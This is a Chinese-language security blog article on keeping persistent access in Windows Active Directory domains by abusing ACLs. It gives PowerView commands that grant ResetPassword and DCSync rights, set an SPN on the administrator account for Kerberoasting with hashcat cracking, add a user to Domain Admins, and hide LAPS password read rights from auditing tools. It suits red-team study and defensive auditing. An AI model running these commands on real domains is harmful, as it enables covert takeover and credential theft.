> 原文链接: https://www.anquanke.com//post/id/172851 


# Windows下的权限维持（二）


                                阅读量   
                                **262311**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0128b1b740f49b1bc2.png)](https://p0.ssl.qhimg.com/t0128b1b740f49b1bc2.png)



## 0x00 前言

​ 本文就主要针对上一篇文章&lt;windows 下的权限维持&gt; 中的后续补充。本文主要是讲解下关于利用域中的环境的权限维持方法。



## 0x01 ACL 介绍

​ 在windows 中有一个安全对象包至少含有：

```
1. a header of control bits
2. the security identifier (SID) of the object owner
3. the SID of the object’s primary group
```

参考链接：`https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/securable-objects`

安全描述符也都会包含有DACL和SACL([MS-DTYP]2.4.6.1)：

[![](https://p2.ssl.qhimg.com/t01bfbc541fb5a63189.png)](https://p2.ssl.qhimg.com/t01bfbc541fb5a63189.png)

所以在很多文档中说的ACL一般都是指对象的安全描述符中的SACL和DACL。

​ [SACL](https://docs.microsoft.com/en-us/windows/desktop/AD/retrieving-an-objectampaposs-sacl):`A SACL contains access-control entries (ACEs) that specify the types of access attempts that generate audit records in the security event log of a domain controller` 。包含ACE，生成对域控的安全对象访问的日志。

[![](https://p2.ssl.qhimg.com/t0122209fe871dcc5f1.png)](https://p2.ssl.qhimg.com/t0122209fe871dcc5f1.png)

比如添加在SACL中添加一个ACE，记录exchange server组对安全对象访问的日志：

[![](https://p1.ssl.qhimg.com/t011e45cc6e027b1552.png)](https://p1.ssl.qhimg.com/t011e45cc6e027b1552.png)

​ DACL:`An access control list (ACL) that is controlled by the owner of an object and that specifies the access particular users or groups can have to the object.` 由对象的所有者控制，并指定特定用户或组对该对象的访问权限。

[![](https://p5.ssl.qhimg.com/t017eb404af84fbc1d1.png)](https://p5.ssl.qhimg.com/t017eb404af84fbc1d1.png)

​ ACE:<code>An entry in an access control list (ACL) that contains a set of user<br>
rights and a security identifier (SID) that identifies a principal for whom the rights are<br>
allowed, denied, or audited.</code> ACL中的一个元素，指定访问权限。其中ACE也有两种类型：一般的ACE和特殊对象的ACE，而关于其中字段说明，参考[The-structure-of-an-ACE](https://searchwindowsserver.techtarget.com/feature/The-structure-of-an-AC)。

[![](https://p1.ssl.qhimg.com/t0133c0efbf6e201688.png)](https://p1.ssl.qhimg.com/t0133c0efbf6e201688.png)

<th style="text-align: center;">一般ACE</th><th style="text-align: center;">特殊对象ACE</th>
|------
<td style="text-align: center;">[![](https://p2.ssl.qhimg.com/t014cd8fe14e8ab967c.png)](https://p2.ssl.qhimg.com/t014cd8fe14e8ab967c.png)</td><td style="text-align: center;">[![](https://p4.ssl.qhimg.com/t015b5ecf6d2f1ace48.png)](https://p4.ssl.qhimg.com/t015b5ecf6d2f1ace48.png)</td>

​ 例如Exchange的那个[漏洞](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)，就是利用了其在域中**Exchange Trusted Subsystem** 和**Exchange Windows Permissions** ACE如下图，具有`writedacl` 的权限，可以修改DACL，参考[Exchange-AD-Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc)。如果在内网中安装有`azure ad connect`的话，也是具有修改对象的权限。因为自己家电脑上没有这个环境，看下[reference-connect-accounts-permissions](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions)也是可以知道的，利用来作为后门的方法也是很多的。

[![](https://p1.ssl.qhimg.com/t016c263fdde547b9f3.png)](https://p1.ssl.qhimg.com/t016c263fdde547b9f3.png)



## 0x02 User

对于用户的攻击有两种：1.强制重制用户的密码。

### <a class="reference-link" name="1.ResetPassword"></a>1.ResetPassword

`User-Force-Change-Password right (GUID: 00299570-246d-11d0-a768-00aa006e0529)` 使cond用户具有修改administrator用户密码的权限。

powerview:

```
#add dcsync
Add-DomainObjectAcl -TargetIdentity cond -PrincipalIdentity administrator -Rights ResetPassword
```

[![](https://p3.ssl.qhimg.com/t01e285060466093b9a.png)](https://p3.ssl.qhimg.com/t01e285060466093b9a.png)

### <a class="reference-link" name="2.Kerberoasting"></a>2.Kerberoasting

Kerberoasting:允许攻击者获取到TGS离线破解等到目标用户的密码。详细内容可以参考[targeted-kerberoasting](http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/)。（我人晕了，我正在写这篇文章的时候发现，3gstudent刚写了[域渗透-Kerberoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)，有几次我在研究的东西不久，大佬就会发一个关于这个的文章，比如ACL，GPO，exchange等，大佬下一次是不是会有exchange的利用？）

因为默认域用户一般是没有SPN的，只有服务账号krbtgt或者sqlsvc，域内主机账号才会有SPN：

[![](https://p5.ssl.qhimg.com/t010b3dcf09d53a0bdc.png)](https://p5.ssl.qhimg.com/t010b3dcf09d53a0bdc.png)

上面就是我给管理员用户设置了一个SPN。

PS代码：

```
#以管理员权限运行注册一个SPN服务
Set-DomainObject -Identity administrator -Set @`{`serviceprincipalname = 'a/bdsa'`}`
Get-DomainUser administrator -Properties serviceprincipalname
```

在域内一台普通机器上，使用普通用户登录然后执行：

[![](https://p1.ssl.qhimg.com/t01d70f28fb9e409d00.png)](https://p1.ssl.qhimg.com/t01d70f28fb9e409d00.png)

然后把ticket拿去离线破解`hashcat64.exe -m 13100 -a 0 hash.txt password.txt`

[![](https://p4.ssl.qhimg.com/t01d8c5424278909c3f.png)](https://p4.ssl.qhimg.com/t01d8c5424278909c3f.png)

清除SPN：

```
Set-DomainObject -Identity administrator -clear serviceprincipalname
```

再在域中获取就会显示失败：

[![](https://p2.ssl.qhimg.com/t01bc07f839283888c8.png)](https://p2.ssl.qhimg.com/t01bc07f839283888c8.png)

可以参考[htb-writeup-active](https://snowscan.io/htb-writeup-active/)，其中就使用到了kerberoast的方法。

### <a class="reference-link" name="3.dcsync"></a>3.dcsync

`DCSYNC` `DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)` ，就是向对象添加一个ACE，使得普通用户也具有权限。

比如使用powerview:

```
#add dcsync
Add-DomainObjectAcl -TargetIdentity "DC=hack,DC=com" -PrincipalIdentity cond -Rights DCSync
#remove
remove-DomainObjectAcl -TargetIdentity "DC=hack,DC=com" -PrincipalIdentity cond -Rights DCSync
```

[![](https://p5.ssl.qhimg.com/t0132102eb7679f7c13.png)](https://p5.ssl.qhimg.com/t0132102eb7679f7c13.png)

在使用bloodhound查看dcsync的权限：

[![](https://p2.ssl.qhimg.com/t01f3b977ab55f50354.png)](https://p2.ssl.qhimg.com/t01f3b977ab55f50354.png)



## 0x03 Group

​ 对于组的利用，就是将用户添加到`domain admins`或者`enterprise admins`，或者修改`primarygroupid`。

这里依然是使用powerview当然你也直接net group添加：

```
Add-DomainGroupMember "domain admins" -Members cond
```

[![](https://p4.ssl.qhimg.com/t0134831550113a3828.png)](https://p4.ssl.qhimg.com/t0134831550113a3828.png)



## 0x04 Computer

​ Computer对象就是一种特殊的user对象。如果域中安装了LAPS，那么computer 对象会有一个`ms-Mcs-AdmPwd`属性保存了明文的密码。默认是只有管理员组的用户才能读取这个属性，但是我们可以给其他普通用户权限去读取。

​ 这里简单记录下安装LAPS的过程，先在域控安装完成后，然后通过GPO为域内机器安装，在ADUC新建一个OU，将computer账户移动到这里，还可以为OU配置ACL。在新建一个GPO，配置computer configuration-&gt;policies-&gt;administrative template-&gt;laps 到enable。在域内主机更新组策略后LAPS就配置完成了。

[![](https://p3.ssl.qhimg.com/t012fc3e9166ef7ddc4.png)](https://p3.ssl.qhimg.com/t012fc3e9166ef7ddc4.png)

```
Set-AdmPwdComputerSelfPermission -orgunit "IT"
Find-AdmPwdExtendedRights -Identity it -IncludeComputers|fl
#添加其他组访问admpwd的权限
Set-AdmPwdReadPasswordPermission -Identity it -AllowedPrincipals itadmins
```

[![](https://p1.ssl.qhimg.com/t015a80320ec76612be.png)](https://p1.ssl.qhimg.com/t015a80320ec76612be.png)

为了读取`ms-Mcs-AdmPwd` 必须要ACE的[accessmask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/990fb975-ab31-4bc1-8b75-5da132cd4584)是`DS_CONTROL_ACCESS` ，而且`Find-AdmPwdExtendedRights` 只检查应用于OU和Computers的ACE，其中都会忽略，所以我们建立一个`msImaging-PSPs`对象，在IT OU右键，新建对象。

如果使用`Set-AdmPwdReadPasswordPermission`添加普通用户读取的权限：

[![](https://p3.ssl.qhimg.com/t01869d002a1d842d2d.png)](https://p3.ssl.qhimg.com/t01869d002a1d842d2d.png)

所以使用上述方法后：

```
$PspObject = (Get-DomainObject -raw notOu).getdirectoryentry()
$ace =  New-ADObjectAccessControlEntry -AccessControlType allow -right extendedright -PrincipalIdentity cond -InheritanceType all
$PspObject.psbase.objectsecurity.addaccessrule($ace)
$PspObject.psbase.commitchanges()
```

可以查看下面GIF的效果，在添加ACE到这个Class当中，但是`Find-AdmPwdExtendedRights` 却不能检测出来，开始win10没有加入到其中就不能获取到admpwd，但是在移动到这个class中过后就能读取到admpwd了：

[![](https://p3.ssl.qhimg.com/t013417885e1ed93ea5.gif)](https://p3.ssl.qhimg.com/t013417885e1ed93ea5.gif)

当然也可以针对组来对对应GUID设置ACE：

```
$tobj = $(get-domaincomputer -Raw win10).getdirectoryentry()
$guids = get-domainguidmap
#get admpwd guid
$admpwdguid = $guids.getenumerator()| ?`{`$_.value -eq 'ms-mcs-admpwd'`}`|select -expandproperty name

#ace
$ace =  New-ADObjectAccessControlEntry -AccessControlType allow -right extendedright -PrincipalIdentity "domain users" -objecttype $admpwdguid -InheritedobjectType ([guid]::empty) -InheritanceType all
$PspObject.psbase.objectsecurity.addaccessrule($ace)
$PspObject.psbase.commitchanges()
```

这样就可以domian users就可以访问admpwd了，而且也是不会显示出来：

[![](https://p1.ssl.qhimg.com/t0199d853fff81f8171.png)](https://p1.ssl.qhimg.com/t0199d853fff81f8171.png)

LAPS还有两种方法，修改`searchFlags`或者通过[admpwd.dll](https://github.com/GreyCorbel/admpwd)注入后门代码将修改后的密码保存下来，更多的详细可以参考[malicious-use-of-microsoft-laps](https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/)。



## 0x05 总结

​ 这篇文章是对上一篇的部分补充，介绍了针对域内不同类型的权限维持的方法，我这里并没有把这些方法所产生的日志贴出来了，毕竟一些重视安全的公司，日志审查还是很厉害的，各位可以自己测试下，谨慎选择。可能还有后续，但都是一些详细补充了。
